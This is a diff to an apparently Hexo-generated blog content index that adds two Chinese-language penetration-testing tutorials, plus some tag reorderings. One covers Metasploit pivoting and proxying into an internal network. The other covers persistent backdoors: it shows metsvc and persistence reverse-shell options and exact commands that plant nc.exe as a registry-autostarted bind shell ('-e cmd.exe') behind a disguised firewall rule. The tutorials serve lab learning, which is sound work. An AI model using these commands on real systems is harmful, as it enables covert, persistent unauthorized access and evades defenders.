@@ -4,6 +4,64 @@
   
   
   <entry>
+    <title>使用MSF进行内网渗透</title>
+    <link href="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    <url>/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    
+    <content type="html"><![CDATA[<p>内网的跳板攻击与代理设置</p><a id="more"></a><h1 id="使用MSF进行内网渗透"><a href="#使用MSF进行内网渗透" class="headerlink" title="使用MSF进行内网渗透"></a>使用MSF进行内网渗透</h1><p>网络示意图</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.png" srcset="/img/loading.gif" alt></p><h2 id="01-使用msf获取shell"><a href="#01-使用msf获取shell" class="headerlink" title="01 使用msf获取shell"></a>01 使用msf获取shell</h2><p>生成后门程序，注意反弹IP要是公网IP，注意目标32位还是64位</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.png" srcset="/img/loading.gif" alt></p><p>设置payload，然后exploit</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.png" srcset="/img/loading.gif" alt></p><p>当前状态：攻击者（192.168.101.168）使用meterpreter与web服务器（192.168.31.164）获得了通信，但还无法访问内网（192.168.103.*）</p><h2 id="02-跳板攻击与自动路由"><a href="#02-跳板攻击与自动路由" class="headerlink" title="02 跳板攻击与自动路由"></a>02 跳板攻击与自动路由</h2><ul><li>Pivoting<ul><li>利用已经被入侵的主机作为跳板来攻击网络中的其他系统</li><li>访问由于路由问题而不能直接访问的内网系统</li></ul></li><li>自动路由<ul><li>Run autoroute -s 192.168.103.0/24</li><li>Run post/multi/manage/autoroute</li><li>扫描内网网络<ul><li>Run post/windows/gather/arp_scanner rhosts=192.168.103.0/24</li><li>use auxiliary/scanner/portscan/tcp</li></ul></li></ul></li></ul><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>添加自动路由</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.png" srcset="/img/loading.gif" alt></p><p>使用-p查看路由表，成功获得了跳板</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png" srcset="/img/loading.gif" alt></p><p>有了跳板之后，可以对内网进行扫描</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png" srcset="/img/loading.gif" alt></p><p>TCP端口扫描</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.png" srcset="/img/loading.gif" alt></p><h2 id="03-设置代理"><a href="#03-设置代理" class="headerlink" title="03 设置代理"></a>03 设置代理</h2><p>要想使用msf之外的工具，需要设置代理</p><ul><li>Socket代理<ul><li>auxiliary/server/socks4a</li></ul></li><li>ProxyChains<ul><li>任何TCP连接都可以通过TOR或者SOCKS4，SOCKS5，HTTP/HTTPS到达目的地，在这个通道技术中可以使用多个代理服务器，除此之外还提供匿名网络</li></ul></li></ul><h3 id="操作过程-1"><a href="#操作过程-1" class="headerlink" title="操作过程"></a>操作过程</h3><p>使用socket代理，配置选项</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png" srcset="/img/loading.gif" alt></p><p>开启代理</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.png" srcset="/img/loading.gif" alt></p><p>配置proxychains</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.png" srcset="/img/loading.gif" alt></p><p>在末尾添加上使用的socks4代理</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.png" srcset="/img/loading.gif" alt></p><p>配置好之后即可使用nmap对内网进行扫描，查看是否存在ms08-067漏洞</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.png" srcset="/img/loading.gif" alt></p><p>使用msf进行攻击</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.png" srcset="/img/loading.gif" alt></p><p>注意payload要使用直连而非反弹shell，因为路由是单向的，靶机无法访问到攻击者主机</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.png" srcset="/img/loading.gif" alt></p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.png" srcset="/img/loading.gif" alt></p><p>对内网攻击时，都是通过跳板，显示的攻击者IP是跳板机的IP</p><h3 id="多级内网的情况"><a href="#多级内网的情况" class="headerlink" title="多级内网的情况"></a>多级内网的情况</h3><p>存在多级内网时，需要再次添加代理</p><p>设置代理</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.png" srcset="/img/loading.gif" alt></p><p>再添加一个端口</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.png" srcset="/img/loading.gif" alt></p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/19.png" srcset="/img/loading.gif" alt></p><p>设置proxychains</p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20.png" srcset="/img/loading.gif" alt></p><p><img src="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/21.png" srcset="/img/loading.gif" alt></p><p>之后就可以使用nmap进行扫描</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>内网渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
+      
+      <tag>MSF</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>MSF和NC永久后门植入</title>
+    <link href="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/"/>
+    <url>/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<p>创建永久后门的方法</p><a id="more"></a><h1 id="MSF和NC永久后门植入"><a href="#MSF和NC永久后门植入" class="headerlink" title="MSF和NC永久后门植入"></a>MSF和NC永久后门植入</h1><ul><li>为什么要植入后门？<ul><li>Meterpreter Shell运行于内存之中，重启之后就将失效</li><li>避免重复性的渗透工作</li><li>漏洞修复后仍旧可以维持控制</li><li>存在于内存中不读取磁盘文件，不易被发现</li><li>有些漏洞多次利用后服务器或漏洞会损坏</li></ul></li></ul><h2 id="01-MSF后门"><a href="#01-MSF后门" class="headerlink" title="01 MSF后门"></a>01 MSF后门</h2><h3 id="metsvc后门"><a href="#metsvc后门" class="headerlink" title="metsvc后门"></a>metsvc后门</h3><ul><li>使用run metsvc启动<ul><li>-A 自动连接后门</li><li>-h 查看帮助菜单</li><li>-r 卸载已存的后门（文件要手动删除）</li></ul></li></ul><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/1.png" srcset="/img/loading.gif" alt></p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/2.png" srcset="/img/loading.gif" alt></p><ul><li>端口固定为31337，如果扫描发现31337打开，就很可能被植入过后门</li><li>防火墙和UAC可能会影响后门</li></ul><h3 id="persistence后门"><a href="#persistence后门" class="headerlink" title="persistence后门"></a>persistence后门</h3><ul><li>使用 run persistence -h 查看帮助菜单，如图</li></ul><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/3.png" srcset="/img/loading.gif" alt></p><ul><li>比较重要的参数有：<ul><li>-A 自动连接后门</li><li>-P 设置payload，默认为 windows/meterpreter/reverse_tcp 默认32位，当目标机器为64位时将无法运行</li><li>-U 设置后门在用户登录后自动启动，推荐使用</li><li>-X 设置后门在用户登录后自动启动，在非管理员权限或未进行BypassUAC时不推荐使用</li><li>-i 设置反向连接的时间间隔</li><li>-p 设置反向连接的端口号</li><li>-r 设置反向连接的IP地址</li></ul></li></ul><p>运行persistence后门，设置了时间间隔为20</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/4.png" srcset="/img/loading.gif" alt></p><p>成功获取了Session，编号是21</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/5.png" srcset="/img/loading.gif" alt></p><p>手动关闭获取的Session</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/6.png" srcset="/img/loading.gif" alt></p><p>由于设置了i参数，20s后重新获得了Session，编号变成了22</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/7.png" srcset="/img/loading.gif" alt></p><p>由于使用了-X参数，目标靶机重启后也会自动连接上Session</p><h2 id="02-NC后门"><a href="#02-NC后门" class="headerlink" title="02 NC后门"></a>02 NC后门</h2><h3 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h3><ul><li>上传nc<br>upload /root/nc.exe C:\\windows\system32</li><li>修改注册表<ul><li>枚举注册表键值<br>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</li><li>在当前主键下增加一个nc键值<br>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d ‘C:\\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</li><li>查看键值<br>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc</li></ul></li><li>设置防火墙<ul><li>开启一个cmd通道<br>Execute -f cmd -i -H</li><li>查看防火墙状态<br>Netsh firewall show opmode</li><li>添加防火墙规则允许444端口通过<br>Netsh firewall add portopening TCP 444 “Service Firewall” ENABLE</li><li>查看端口状态<br>Netsh firewall show portopening</li></ul></li><li>开始连接<br>nc -v ip port</li></ul><h3 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h3><p> 添加键值 -Ldp 444 -e cmd.exe 表示把cmd转发的444端口</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/8.png" srcset="/img/loading.gif" alt></p><p>查看添加的键值</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/9.png" srcset="/img/loading.gif" alt></p><p>登录到cmd</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/10.png" srcset="/img/loading.gif" alt></p><p>直接关闭防火墙容易引起怀疑，可以将444端口伪装成正常的防火墙而不被过滤，不容易被发现</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/11.png" srcset="/img/loading.gif" alt></p><p>靶机重启后自动运行了nc.exe,后门仍然有效<br>在kali中使用nc进行连接，获得shell</p><p><img src="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/12.png" srcset="/img/loading.gif" alt></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>内网渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
+      
+      <tag>MSF</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Linux基本命令</title>
     <link href="/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
     <url>/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
@@ -38,18 +96,18 @@
     
     <categories>
       
-      <category>工具使用</category>
+      <category>内网渗透</category>
       
     </categories>
     
     
     <tags>
       
-      <tag>MSF</tag>
+      <tag>渗透测试</tag>
       
       <tag>工具使用</tag>
       
-      <tag>渗透测试</tag>
+      <tag>MSF</tag>
       
     </tags>
     
@@ -74,11 +132,11 @@
     
     <tags>
       
-      <tag>MSF</tag>
+      <tag>渗透测试</tag>
       
       <tag>工具使用</tag>
       
-      <tag>渗透测试</tag>
+      <tag>MSF</tag>
       
     </tags>
     
@@ -369,9 +427,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>CRLF</tag>
-      
       <tag>XSS</tag>
+      
+      <tag>CRLF</tag>
       
     </tags>
     
@@ -398,9 +456,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
@@ -649,9 +707,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>代码审计</tag>
-      
       <tag>代码执行</tag>
+      
+      <tag>代码审计</tag>
       
     </tags>
     
@@ -707,9 +765,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>命令执行</tag>
-      
       <tag>代码审计</tag>
+      
+      <tag>命令执行</tag>
       
     </tags>
     
@@ -871,9 +929,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
@@ -927,9 +985,9 @@
       
       <tag>工具使用</tag>
       
-      <tag>python</tag>
-      
       <tag>密码学</tag>
+      
+      <tag>python</tag>
       
     </tags>
     
